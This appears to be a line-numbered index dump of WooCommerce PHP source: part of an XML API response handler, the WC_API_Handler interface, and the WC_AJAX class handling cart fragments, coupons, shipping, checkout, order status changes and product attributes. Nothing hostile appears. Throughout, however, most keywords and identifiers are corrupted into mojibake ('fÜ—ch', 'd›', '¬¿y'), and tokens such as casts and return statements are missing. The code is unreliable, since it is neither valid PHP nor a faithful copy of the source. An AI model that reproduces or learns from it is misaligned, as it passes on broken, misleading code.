xml
->
	`‹xt
Ğ
$©Œibu‹_v®ue
 );

135 
$this
->
xml
->
	`’dA‰ribu‹
();

141 iàĞ
	`is_num”ic
Ğ
	`key
Ğ
$–em’t_v®ue
 ) ) ) {

144 
	`fÜ—ch
 ( 
$–em’t_v®ue
 
as
 
$chd_–em’t_key
 => 
$chd_–em’t_v®ue
 ) {

146 
$this
->
xml
->
	`¡¬tEËm’t
Ğ
$–em’t_key
 );

148 
	`fÜ—ch
 ( 
$chd_–em’t_v®ue
 
as
 
$siblšg_–em’t_key
 => 
$siblšg_–em’t_v®ue
 ) {

149 
$this
->
	`¬¿y_to_xml
Ğ
$siblšg_–em’t_key
, 
$siblšg_–em’t_v®ue
 );

152 
$this
->
xml
->
	`’dEËm’t
();

158 
$this
->
xml
->
	`¡¬tEËm’t
Ğ
$–em’t_key
 );

161 
	`fÜ—ch
 ( 
$–em’t_v®ue
 
as
 
$chd_–em’t_key
 => 
$chd_–em’t_v®ue
 ) {

162 
$this
->
	`¬¿y_to_xml
Ğ
$chd_–em’t_key
, 
$chd_–em’t_v®ue
 );

166 
$this
->
xml
->
	`’dEËm’t
();

172 iàĞ'@v®ue' =ğ
$–em’t_key
 ) {

174 
$this
->
xml
->
	`‹xt
Ğ
$–em’t_v®ue
 );

179 iàĞ
çl£
 !=ğ
	`¡½os
Ğ
$–em’t_v®ue
, '<' ) || false !== strpos( $element_value, '>' ) ) {

181 
$this
->
xml
->
	`¡¬tEËm’t
Ğ
$–em’t_key
 );

182 
$this
->
xml
->
	`wr™eCd©a
Ğ
$–em’t_v®ue
 );

183 
$this
->
xml
->
	`’dEËm’t
();

187 
$this
->
xml
->
	`wr™eEËm’t
Ğ
$–em’t_key
, 
$–em’t_v®ue
 );

194 
	}
}

204 
public
 
funùiÚ
 
	$fÜm©_§Ës_»pÜt_d©a
Ğ
$d©a
 ) {

206 iàĞ! 
	`em±y
Ğ
$d©a
['totals'] ) ) {

208 
	`fÜ—ch
 ( 
$d©a
['tÙ®s'] 
as
 
$d©e
 => 
$tÙ®s
 ) {

210 
	`un£t
Ğ
$d©a
['tÙ®s'][ 
$d©e
 ] );

212 
$d©a
['tÙ®s'][] = 
	`¬¿y_m”ge
Ğ
	`¬¿y
Ğ'@©Œibu‹s' =>‡¼ayĞ'd©e' => 
$d©e
 ) ), 
$tÙ®s
 );

216  
$d©a
;

217 
	}
}

229 
public
 
funùiÚ
 
	$fÜm©_´oduù_d©a
Ğ
$d©a
 ) {

232 iàĞ! 
	`em±y
Ğ
$d©a
['attributes'] ) ) {

234 
	`fÜ—ch
 ( 
$d©a
['©Œibu‹s'] 
as
 
$©Œibu‹_key
 => 
$©Œibu‹
 ) {

236 iàĞ! 
	`em±y
Ğ
$©Œibu‹
['İtiÚs'] ) && 
	`is_¬¿y
( $attribute['options'] ) ) {

238 
	`fÜ—ch
 ( 
$©Œibu‹
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ
 ) {

240 
	`un£t
Ğ
$d©a
['©Œibu‹s'][ 
$©Œibu‹_key
 ]['İtiÚs'][ 
$İtiÚ_key
 ] );

242 
$d©a
['©Œibu‹s'][ 
$©Œibu‹_key
 ]['İtiÚs']['İtiÚ'][] = 
	`¬¿y
Ğ
$İtiÚ
 );

250 
$f›lds_to_fix
 = 
	`¬¿y
(

258 
	`fÜ—ch
 ( 
$f›lds_to_fix
 
as
 
$·»Á_f›ld_Çme
 => 
$chd_f›ld_Çme
 ) {

260 iàĞ! 
	`em±y
Ğ
$d©a
[ 
$·»Á_f›ld_Çme
 ] ) ) {

262 
	`fÜ—ch
 ( 
$d©a
[ 
$·»Á_f›ld_Çme
 ] 
as
 
$f›ld_key
 => 
$f›ld
 ) {

264 
	`un£t
Ğ
$d©a
[ 
$·»Á_f›ld_Çme
 ][ 
$f›ld_key
 ] );

266 
$d©a
[ 
$·»Á_f›ld_Çme
 ][ 
$chd_f›ld_Çme
 ][] = 
	`¬¿y
Ğ
$f›ld
 );

272 iàĞ! 
	`em±y
Ğ
$d©a
['parent'] ) ) {

275 iàĞ! 
	`em±y
Ğ
$d©a
['parent']['attributes'] ) ) {

277 
	`fÜ—ch
 ( 
$d©a
['·»Á']['©Œibu‹s'] 
as
 
$©Œibu‹_key
 => 
$©Œibu‹
 ) {

279 iàĞ! 
	`em±y
Ğ
$©Œibu‹
['İtiÚs'] ) && 
	`is_¬¿y
( $attribute['options'] ) ) {

281 
	`fÜ—ch
 ( 
$©Œibu‹
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ
 ) {

283 
	`un£t
Ğ
$d©a
['·»Á']['©Œibu‹s'][ 
$©Œibu‹_key
 ]['İtiÚs'][ 
$İtiÚ_key
 ] );

285 
$d©a
['·»Á']['©Œibu‹s'][ 
$©Œibu‹_key
 ]['İtiÚs']['İtiÚ'][] = 
	`¬¿y
Ğ
$İtiÚ
 );

292 
	`fÜ—ch
 ( 
$f›lds_to_fix
 
as
 
$·»Á_f›ld_Çme
 => 
$chd_f›ld_Çme
 ) {

294 iàĞ! 
	`em±y
Ğ
$d©a
['·»Á'][ 
$·»Á_f›ld_Çme
 ] ) ) {

296 
	`fÜ—ch
 ( 
$d©a
['·»Á'][ 
$·»Á_f›ld_Çme
 ] 
as
 
$f›ld_key
 => 
$f›ld
 ) {

298 
	`un£t
Ğ
$d©a
['·»Á'][ 
$·»Á_f›ld_Çme
 ][ 
$f›ld_key
 ] );

300 
$d©a
['·»Á'][ 
$·»Á_f›ld_Çme
 ][ 
$chd_f›ld_Çme
 ][] = 
	`¬¿y
Ğ
$f›ld
 );

306  
$d©a
;

307 
	}
}

	@includes/api/interface-wc-api-handler.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 
š‹rçû
 
	gWC_API_HªdËr
 {

25 
public
 
funùiÚ
 
g‘_cÚ‹Á_ty³
();

34 
public
 
funùiÚ
 
·r£_body
Ğ
$d©a
 );

43 
public
 
funùiÚ
 
g’”©e_»¥Ú£
Ğ
$d©a
 );

	@includes/class-wc-ajax.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_AJAX
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$ajax_ev’ts
 = 
	`¬¿y
(

25 'g‘_»äeshed_äagm’ts' => 
Œue
,

26 '­¶y_coupÚ' => 
Œue
,

27 'upd©e_shpšg_m‘hod' => 
Œue
,

28 'upd©e_Üd”_»v›w' => 
Œue
,

29 'add_to_ÿ¹' => 
Œue
,

30 'checkout' => 
Œue
,

31 'ã©u»_´oduù' => 
çl£
,

32 'm¬k_Üd”_com¶‘e' => 
çl£
,

33 'm¬k_Üd”_´oûssšg' => 
çl£
,

34 'add_Ãw_©Œibu‹' => 
çl£
,

35 '»move_v¬ŸtiÚ' => 
çl£
,

36 '»move_v¬ŸtiÚs' => 
çl£
,

37 '§ve_©Œibu‹s' => 
çl£
,

38 'add_v¬ŸtiÚ' => 
çl£
,

39 'lšk_®l_v¬ŸtiÚs' => 
çl£
,

40 '»voke_acûss_to_dowÆßd' => 
çl£
,

41 'g¿Á_acûss_to_dowÆßd' => 
çl£
,

42 'g‘_cu¡om”_d‘as' => 
çl£
,

43 'add_Üd”_™em' => 
çl£
,

44 'add_Üd”_ãe' => 
çl£
,

45 '»move_Üd”_™em' => 
çl£
,

46 '»duû_Üd”_™em_¡ock' => 
çl£
,

47 'šü—£_Üd”_™em_¡ock' => 
çl£
,

48 'add_Üd”_™em_m‘a' => 
çl£
,

49 '»move_Üd”_™em_m‘a' => 
çl£
,

50 'ÿlc_lše_xes' => 
çl£
,

51 'add_Üd”_nÙe' => 
çl£
,

52 'd–‘e_Üd”_nÙe' => 
çl£
,

53 'jsÚ_£¬ch_´oduùs' => 
çl£
,

54 'jsÚ_£¬ch_´oduùs_ªd_v¬ŸtiÚs' => 
çl£
,

55 'jsÚ_£¬ch_dowÆßdabË_´oduùs_ªd_v¬ŸtiÚs' => 
çl£
,

56 'jsÚ_£¬ch_cu¡om”s' => 
çl£
,

57 '‹rm_Üd”šg' => 
çl£
,

58 '´oduù_Üd”šg' => 
çl£


61 
	`fÜ—ch
 ( 
$ajax_ev’ts
 
as
 
$ajax_ev’t
 => 
$nİriv
 ) {

62 
	`add_aùiÚ
Ğ'wp_ajax_woocomm”û_' . 
$ajax_ev’t
, 
	`¬¿y
Ğ
$this
, $ajax_event ) );

64 iàĞ
$nİriv
 )

65 
	`add_aùiÚ
Ğ'wp_ajax_nİriv_woocomm”û_' . 
$ajax_ev’t
, 
	`¬¿y
Ğ
$this
, $ajax_event ) );

72 
´iv©e
 
funùiÚ
 
	$jsÚ_h—d”s
() {

73 
	`h—d”
( 'Content-Type:‡pplication/json; charset=utf-8' );

74 
	}
}

80 
public
 
funùiÚ
 
	$g‘_»äeshed_äagm’ts
() {

82 
$this
->
	`jsÚ_h—d”s
();

85 
	`ob_¡¬t
();

87 
	`woocomm”û_mši_ÿ¹
();

89 
$mši_ÿ¹
 = 
	`ob_g‘_ş—n
();

92 
$d©a
 = 
	`¬¿y
(

93 'äagm’ts' => 
	`­¶y_f‹rs
Ğ'add_to_ÿ¹_äagm’ts', 
	`¬¿y
(

94 'div.widg‘_shİpšg_ÿ¹_cÚ‹Á' => '<div cÏss="widg‘_shİpšg_ÿ¹_cÚ‹Á">' . 
$mši_ÿ¹
 . '</div>'

97 'ÿ¹_hash' => 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è? 
	`md5
Ğ
	`jsÚ_’code
( WC()->cart->get_cart() ) ) : ''

100 
echo
 
	`jsÚ_’code
Ğ
$d©a
 );

102 
	`d›
();

103 
	}
}

108 
public
 
funùiÚ
 
	$­¶y_coupÚ
() {

110 
	`check_ajax_»ã»r
( 'apply-coupon', 'security' );

112 iàĞ! 
	`em±y
Ğ
$_POST
['coupon_code'] ) ) {

113 
	`WC
()->
ÿ¹
->
	`add_discouÁ
Ğ
	`§n™ize_‹xt_f›ld
Ğ
$_POST
['coupon_code'] ) );

115 
	`wc_add_nÙiû
Ğ
WC_CoupÚ
::
	`g‘_g’”ic_coupÚ_”rÜ
ĞWC_CoupÚ::
E_WC_COUPON_PLEASE_ENTER
 ), 'error' );

118 
	`wc_´št_nÙiûs
();

120 
	`d›
();

121 
	}
}

126 
public
 
funùiÚ
 
	$upd©e_shpšg_m‘hod
() {

128 
	`check_ajax_»ã»r
( 'update-shipping-method', 'security' );

130 iàĞ! 
	`defšed
('WOOCOMMERCE_CART'èè
	`defše
Ğ'WOOCOMMERCE_CART', 
Œue
 );

132 
$cho£n_shpšg_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

134 iàĞ
	`is£t
Ğ
$_POST
['shpšg_m‘hod'] ) && 
	`is_¬¿y
( $_POST['shipping_method'] ) ) {

135 
	`fÜ—ch
 ( 
$_POST
['shpšg_m‘hod'] 
as
 
$i
 => 
$v®ue
 ) {

136 
$cho£n_shpšg_m‘hods
[ 
$i
 ] = 
	`wc_ş—n
Ğ
$v®ue
 );

140 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_shpšg_m‘hods', 
$cho£n_shpšg_m‘hods
 );

142 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

144 
	`woocomm”û_ÿ¹_tÙ®s
();

146 
	`d›
();

147 
	}
}

152 
public
 
funùiÚ
 
	$upd©e_Üd”_»v›w
() {

154 
	`check_ajax_»ã»r
( 'update-order-review', 'security' );

156 iàĞ! 
	`defšed
( 'WOOCOMMERCE_CHECKOUT' ) )

157 
	`defše
Ğ'WOOCOMMERCE_CHECKOUT', 
Œue
 );

159 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) == 0 ) {

160 
echo
 '<div cÏss="woocomm”û-”rÜ">' . 
	`__
Ğ'SÜry, you¸£ssiÚ ha expœed.', 'woocomm”û' ) . ' <¨h»f="' . 
	`home_u¾
() . '" class="wc-backward">' . __( 'Returno homepage', 'woocommerce' ) . '</a></div>';

161 
	`d›
();

164 
	`do_aùiÚ
Ğ'woocomm”û_checkout_upd©e_Üd”_»v›w', 
$_POST
['post_data'] );

166 
$cho£n_shpšg_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

168 iàĞ
	`is£t
Ğ
$_POST
['shpšg_m‘hod'] ) && 
	`is_¬¿y
( $_POST['shipping_method'] ) )

169 
	`fÜ—ch
 ( 
$_POST
['shpšg_m‘hod'] 
as
 
$i
 => 
$v®ue
 )

170 
$cho£n_shpšg_m‘hods
[ 
$i
 ] = 
	`wc_ş—n
Ğ
$v®ue
 );

172 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_shpšg_m‘hods', 
$cho£n_shpšg_m‘hods
 );

173 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_·ym’t_m‘hod', 
	`em±y
Ğ
$_POST
['payment_method'] ) ? '' : $_POST['payment_method'] );

175 iàĞ
	`is£t
Ğ
$_POST
['country'] ) )

176 
	`WC
()->
cu¡om”
->
	`£t_couÁry
Ğ
$_POST
['country'] );

178 iàĞ
	`is£t
Ğ
$_POST
['state'] ) )

179 
	`WC
()->
cu¡om”
->
	`£t_¡©e
Ğ
$_POST
['state'] );

181 iàĞ
	`is£t
Ğ
$_POST
['postcode'] ) )

182 
	`WC
()->
cu¡om”
->
	`£t_po¡code
Ğ
$_POST
['postcode'] );

184 iàĞ
	`is£t
Ğ
$_POST
['city'] ) )

185 
	`WC
()->
cu¡om”
->
	`£t_c™y
Ğ
$_POST
['city'] );

187 iàĞ
	`is£t
Ğ
$_POST
['address'] ) )

188 
	`WC
()->
cu¡om”
->
	`£t_add»ss
Ğ
$_POST
['address'] );

190 iàĞ
	`is£t
Ğ
$_POST
['address_2'] ) )

191 
	`WC
()->
cu¡om”
->
	`£t_add»ss_2
Ğ
$_POST
['address_2'] );

193 iàĞ"yes" =ğ
	`g‘_İtiÚ
( 'woocommerce_ship_to_billing_address_only' ) ) {

195 iàĞ
	`is£t
Ğ
$_POST
['country'] ) )

196 
	`WC
()->
cu¡om”
->
	`£t_shpšg_couÁry
Ğ
$_POST
['country'] );

198 iàĞ
	`is£t
Ğ
$_POST
['state'] ) )

199 
	`WC
()->
cu¡om”
->
	`£t_shpšg_¡©e
Ğ
$_POST
['state'] );

201 iàĞ
	`is£t
Ğ
$_POST
['postcode'] ) )

202 
	`WC
()->
cu¡om”
->
	`£t_shpšg_po¡code
Ğ
$_POST
['postcode'] );

204 iàĞ
	`is£t
Ğ
$_POST
['city'] ) )

205 
	`WC
()->
cu¡om”
->
	`£t_shpšg_c™y
Ğ
$_POST
['city'] );

207 iàĞ
	`is£t
Ğ
$_POST
['address'] ) )

208 
	`WC
()->
cu¡om”
->
	`£t_shpšg_add»ss
Ğ
$_POST
['address'] );

210 iàĞ
	`is£t
Ğ
$_POST
['address_2'] ) )

211 
	`WC
()->
cu¡om”
->
	`£t_shpšg_add»ss_2
Ğ
$_POST
['address_2'] );

214 iàĞ
	`is£t
Ğ
$_POST
['s_country'] ) )

215 
	`WC
()->
cu¡om”
->
	`£t_shpšg_couÁry
Ğ
$_POST
['s_country'] );

217 iàĞ
	`is£t
Ğ
$_POST
['s_state'] ) )

218 
	`WC
()->
cu¡om”
->
	`£t_shpšg_¡©e
Ğ
$_POST
['s_state'] );

220 iàĞ
	`is£t
Ğ
$_POST
['s_postcode'] ) )

221 
	`WC
()->
cu¡om”
->
	`£t_shpšg_po¡code
Ğ
$_POST
['s_postcode'] );

223 iàĞ
	`is£t
Ğ
$_POST
['s_city'] ) )

224 
	`WC
()->
cu¡om”
->
	`£t_shpšg_c™y
Ğ
$_POST
['s_city'] );

226 iàĞ
	`is£t
Ğ
$_POST
['s_address'] ) )

227 
	`WC
()->
cu¡om”
->
	`£t_shpšg_add»ss
Ğ
$_POST
['s_address'] );

229 iàĞ
	`is£t
Ğ
$_POST
['s_address_2'] ) )

230 
	`WC
()->
cu¡om”
->
	`£t_shpšg_add»ss_2
Ğ
$_POST
['s_address_2'] );

233 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

235 
	`do_aùiÚ
( 'woocommerce_checkout_order_review' );

237 
	`d›
();

238 
	}
}

243 
public
 
funùiÚ
 
	$add_to_ÿ¹
() {

244 
$´oduù_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_´oduù_id', 
	`absšt
Ğ
$_POST
['product_id'] ) );

245 
$quªt™y
 = 
	`em±y
Ğ
$_POST
['quªt™y'] ) ? 1 : 
	`­¶y_f‹rs
( 'woocommerce_stock_amount', $_POST['quantity'] );

246 
$·s£d_v®id©iÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_to_ÿ¹_v®id©iÚ', 
Œue
, 
$´oduù_id
, 
$quªt™y
 );

248 iàĞ
$·s£d_v®id©iÚ
 && 
	`WC
()->
ÿ¹
->
	`add_to_ÿ¹
Ğ
$´oduù_id
, 
$quªt™y
 ) ) {

250 
	`do_aùiÚ
Ğ'woocomm”û_ajax_added_to_ÿ¹', 
$´oduù_id
 );

252 iàĞ
	`g‘_İtiÚ
( 'woocommerce_cart_redirect_after_add' ) == 'yes' ) {

253 
	`wc_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 );

257 
$this
->
	`g‘_»äeshed_äagm’ts
();

261 
$this
->
	`jsÚ_h—d”s
();

264 
$d©a
 = 
	`¬¿y
(

265 '”rÜ' => 
Œue
,

266 '´oduù_u¾' => 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_»dœeù_aá”_”rÜ', 
	`g‘_³rm®šk
Ğ
$´oduù_id
 ), $product_id )

269 
echo
 
	`jsÚ_’code
Ğ
$d©a
 );

272 
	`d›
();

273 
	}
}

278 
public
 
funùiÚ
 
	$checkout
() {

279 iàĞ! 
	`defšed
( 'WOOCOMMERCE_CHECKOUT' ) )

280 
	`defše
Ğ'WOOCOMMERCE_CHECKOUT', 
Œue
 );

282 
$woocomm”û_checkout
 = 
	`WC
()->
	`checkout
();

283 
$woocomm”û_checkout
->
	`´oûss_checkout
();

285 
	`d›
(0);

286 
	}
}

291 
public
 
funùiÚ
 
	$ã©u»_´oduù
() {

292 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'edit_products' ) ) {

293 
	`wp_d›
Ğ
	`__
( 'You do‚ot have sufficient…ermissionso‡ccesshis…age.', 'woocommerce' ) );

296 iàĞ! 
	`check_admš_»ã»r
( 'woocommerce-feature-product' ) ) {

297 
	`wp_d›
Ğ
	`__
( 'You haveakenoo†ong. Please go back‡nd„etry.', 'woocommerce' ) );

300 
$po¡_id
 = ! 
	`em±y
Ğ
$_GET
['product_id'] ) ? () $_GET['product_id'] : '';

302 iàĞ! 
$po¡_id
 || 
	`g‘_po¡_ty³
( $post_id ) !== 'product' ) {

303 
d›
;

306 
$ã©u»d
 = 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_ã©u»d', 
Œue
 );

308 iàĞ'yes' ==ğ
$ã©u»d
 ) {

309 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_featured', 'no' );

311 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_featured', 'yes' );

314 
	`wc_d–‘e_´oduù_Œªs›Ás
();

316 
	`wp_§ã_»dœeù
Ğ
	`»move_qu”y_¬g
Ğ
	`¬¿y
Ğ'Œashed', 'uÁ¿shed', 'd–‘ed', 'ids' ), 
	`wp_g‘_»ã»r
() ) );

318 
	`d›
();

319 
	}
}

324 
public
 
funùiÚ
 
	$m¬k_Üd”_com¶‘e
() {

325 iàĞ!
	`cu¼’t_u£r_ÿn
('ed™_shİ_Üd”s'èè
	`wp_d›
Ğ
	`__
( 'You do‚ot have sufficient…ermissionso‡ccesshis…age.', 'woocommerce' ) );

326 iàĞ!
	`check_admš_»ã»r
('woocomm”û-m¬k-Üd”-com¶‘e')è
	`wp_d›
Ğ
	`__
( 'You haveakenoo†ong. Please go back‡nd„etry.', 'woocommerce' ) );

327 
$Üd”_id
 = 
	`is£t
(
$_GET
['order_id']) && () $_GET['order_id'] ? () $_GET['order_id'] : '';

328 ià(!
$Üd”_id
è
d›
;

330 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

331 
$Üd”
->
	`upd©e_¡©us
( 'completed' );

333 
	`wp_§ã_»dœeù
Ğ
	`wp_g‘_»ã»r
() );

335 
	`d›
();

336 
	}
}

341 
public
 
funùiÚ
 
	$m¬k_Üd”_´oûssšg
() {

342 iàĞ!
	`cu¼’t_u£r_ÿn
('ed™_shİ_Üd”s'èè
	`wp_d›
Ğ
	`__
( 'You do‚ot have sufficient…ermissionso‡ccesshis…age.', 'woocommerce' ) );

343 iàĞ!
	`check_admš_»ã»r
('woocomm”û-m¬k-Üd”-´oûssšg')è
	`wp_d›
Ğ
	`__
( 'You haveakenoo†ong. Please go back‡nd„etry.', 'woocommerce' ) );

344 
$Üd”_id
 = 
	`is£t
(
$_GET
['order_id']) && () $_GET['order_id'] ? () $_GET['order_id'] : '';

345 ià(!
$Üd”_id
è
d›
;

347 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

348 
$Üd”
->
	`upd©e_¡©us
( 'processing' );

350 
	`wp_§ã_»dœeù
Ğ
	`wp_g‘_»ã»r
() );

352 
	`d›
();

353 
	}
}

358 
public
 
funùiÚ
 
	$add_Ãw_©Œibu‹
() {

360 
	`check_ajax_»ã»r
( 'add-attribute', 'security' );

362 
$this
->
	`jsÚ_h—d”s
();

364 
$xÚomy
 = 
	`esc_©Œ
Ğ
$_POST
['taxonomy'] );

365 
$‹rm
 = 
	`¡r¦ashes
Ğ
$_POST
['term'] );

367 iàĞ
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) ) {

369 
$»suÉ
 = 
	`wp_š£¹_‹rm
Ğ
$‹rm
, 
$xÚomy
 );

371 iàĞ
	`is_wp_”rÜ
(
$»suÉ
) ) {

372 
echo
 
	`jsÚ_’code
(
	`¬¿y
(

373 '”rÜ' => 
$»suÉ
->
	`g‘_”rÜ_mes§ge
()

376 
echo
 
	`jsÚ_’code
(
	`¬¿y
(

377 '‹rm_id' => 
$»suÉ
['term_id'],

378 'Çme' => 
$‹rm
,

379 '¦ug' => 
	`§n™ize_t™Ë
Ğ
$‹rm
 ),

384 
	`d›
();

385 
	}
}

390 
public
 
funùiÚ
 
	$»move_v¬ŸtiÚ
() {

392 
	`check_ajax_»ã»r
( 'delete-variation', 'security' );

393 
$v¬ŸtiÚ_id
 = 
	`štv®
Ğ
$_POST
['variation_id'] );

394 
$v¬ŸtiÚ
 = 
	`g‘_po¡
(
$v¬ŸtiÚ_id
);

395 iàĞ
$v¬ŸtiÚ
 && $v¬ŸtiÚ->
po¡_ty³
 == "product_variation" )

396 
	`wp_d–‘e_po¡
Ğ
$v¬ŸtiÚ_id
 );

397 
	`d›
();

398 
	}
}

403 
public
 
funùiÚ
 
	$»move_v¬ŸtiÚs
() {

405 
	`check_ajax_»ã»r
( 'delete-variations', 'security' );

406 
$v¬ŸtiÚ_ids
 = (
¬¿y
è
$_POST
['variation_ids'];

407 
	`fÜ—ch
 ( 
$v¬ŸtiÚ_ids
 
as
 
$v¬ŸtiÚ_id
 ) {

408 
$v¬ŸtiÚ
 = 
	`g‘_po¡
(
$v¬ŸtiÚ_id
);

409 iàĞ
$v¬ŸtiÚ
 && $v¬ŸtiÚ->
po¡_ty³
 == "product_variation" )

410 
	`wp_d–‘e_po¡
Ğ
$v¬ŸtiÚ_id
 );

412 
	`d›
();

413 
	}
}

418 
public
 
funùiÚ
 
	$§ve_©Œibu‹s
() {

420 
	`check_ajax_»ã»r
( 'save-attributes', 'security' );

423 
	`·r£_¡r
Ğ
$_POST
['d©a'], 
$d©a
 );

424 
$po¡_id
 = 
	`absšt
Ğ
$_POST
['post_id'] );

427 
$©Œibu‹s
 = 
	`¬¿y
();

429 iàĞ
	`is£t
Ğ
$d©a
['attribute_names'] ) ) {

431 
$©Œibu‹_Çmes
 = 
	`¬¿y_m­
Ğ'¡r¦ashes', 
$d©a
['attribute_names'] );

432 
$©Œibu‹_v®ues
 = 
	`is£t
Ğ
$d©a
['©Œibu‹_v®ues'] ) ? $d©a['©Œibu‹_v®ues'] : 
	`¬¿y
();

434 iàĞ
	`is£t
Ğ
$d©a
['attribute_visibility'] ) )

435 
$©Œibu‹_visib™y
 = 
$d©a
['attribute_visibility'];

437 iàĞ
	`is£t
Ğ
$d©a
['attribute_variation'] ) )

438 
$©Œibu‹_v¬ŸtiÚ
 = 
$d©a
['attribute_variation'];

440 
$©Œibu‹_is_xÚomy
 = 
$d©a
['attribute_is_taxonomy'];

441 
$©Œibu‹_pos™iÚ
 = 
$d©a
['attribute_position'];

443 
$©Œibu‹_Çmes_couÁ
 = Ğ
$©Œibu‹_Çmes
 );

445  
$i
=0; $˜< 
$©Œibu‹_Çmes_couÁ
; $i++ ) {

446 iàĞ! 
$©Œibu‹_Çmes
[ 
$i
 ] )

449 
$is_visibË
 = 
	`is£t
Ğ
$©Œibu‹_visib™y
[ 
$i
 ] ) ? 1 : 0;

450 
$is_v¬ŸtiÚ
 = 
	`is£t
Ğ
$©Œibu‹_v¬ŸtiÚ
[ 
$i
 ] ) ? 1 : 0;

451 
$is_xÚomy
 = 
$©Œibu‹_is_xÚomy
[ 
$i
 ] ? 1 : 0;

453 iàĞ
$is_xÚomy
 ) {

455 iàĞ
	`is£t
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

458 iàĞ
	`is_¬¿y
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

459 
$v®ues
 = 
	`¬¿y_m­
Ğ'§n™ize_t™Ë', 
$©Œibu‹_v®ues
[ 
$i
 ] );

463 
$v®ues
 = 
	`¬¿y_m­
Ğ'¡r¦ashes',‡¼ay_m­Ğ'¡r_gs', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹_v®ues
[ 
$i
 ] ) ) );

467 
$v®ues
 = 
	`¬¿y_f‹r
( $values, 'strlen' );

470 
$v®ues
 = 
	`¬¿y
();

474 iàĞ
	`xÚomy_exi¡s
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) )

475 
	`wp_£t_objeù_‹rms
Ğ
$po¡_id
, 
$v®ues
, 
$©Œibu‹_Çmes
[ 
$i
 ] );

477 iàĞ
$v®ues
 ) {

479 
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) ] = 
	`¬¿y
(

480 'Çme' => 
	`wc_ş—n
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ),

482 'pos™iÚ' => 
$©Œibu‹_pos™iÚ
[ 
$i
 ],

483 'is_visibË' => 
$is_visibË
,

484 'is_v¬ŸtiÚ' => 
$is_v¬ŸtiÚ
,

485 'is_xÚomy' => 
$is_xÚomy


489 } 
	`–£if
 ( 
	`is£t
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

492 
$v®ues
 = 
	`im¶ode
Ğ' ' . 
WC_DELIMITER
 . ' ', 
	`¬¿y_m­
Ğ'wc_ş—n',‡¼ay_m­Ğ'¡r¦ashes', 
	`ex¶ode
ĞWC_DELIMITER, 
$©Œibu‹_v®ues
[ 
$i
 ] ) ) ) );

495 
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) ] = 
	`¬¿y
(

496 'Çme' => 
	`wc_ş—n
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ),

497 'v®ue' => 
$v®ues
,

498 'pos™iÚ' => 
$©Œibu‹_pos™iÚ
[ 
$i
 ],

499 'is_visibË' => 
$is_visibË
,

500 'is_v¬ŸtiÚ' => 
$is_v¬ŸtiÚ
,

501 'is_xÚomy' => 
$is_xÚomy


508 iàĞ! 
	`funùiÚ_exi¡s
( 'attributes_cmp' ) ) {

509 
funùiÚ
 
	`©Œibu‹s_cmp
Ğ
$a
, 
$b
 ) {

510 iàĞ
$a
['pos™iÚ'] =ğ
$b
['position'] )  0;

511  ( 
$a
['pos™iÚ'] < 
$b
['position'] ) ? -1 : 1;

514 
	`uasÜt
Ğ
$©Œibu‹s
, 'attributes_cmp' );

516 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_©Œibu‹s', 
$©Œibu‹s
 );

518 
	`d›
();

519 
	}
}

524 
public
 
funùiÚ
 
	$add_v¬ŸtiÚ
() {

526 
	`check_ajax_»ã»r
( 'add-variation', 'security' );

528 
$po¡_id
 = 
	`štv®
Ğ
$_POST
['post_id'] );

529 
$loİ
 = 
	`štv®
Ğ
$_POST
['loop'] );

531 
$v¬ŸtiÚ
 = 
	`¬¿y
(

532 'po¡_t™Ë' => 'Produù #' . 
$po¡_id
 . ' Variation',

535 'po¡_authÜ' => 
	`g‘_cu¼’t_u£r_id
(),

536 'po¡_·»Á' => 
$po¡_id
,

540 
$v¬ŸtiÚ_id
 = 
	`wp_š£¹_po¡
Ğ
$v¬ŸtiÚ
 );

542 
	`do_aùiÚ
Ğ'woocomm”û_ü—‹_´oduù_v¬ŸtiÚ', 
$v¬ŸtiÚ_id
 );

544 iàĞ
$v¬ŸtiÚ_id
 ) {

546 
$v¬ŸtiÚ_po¡_¡©us
 = 'publish';

547 
$v¬ŸtiÚ_d©a
 = 
	`g‘_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
 );

548 
$v¬ŸtiÚ_d©a
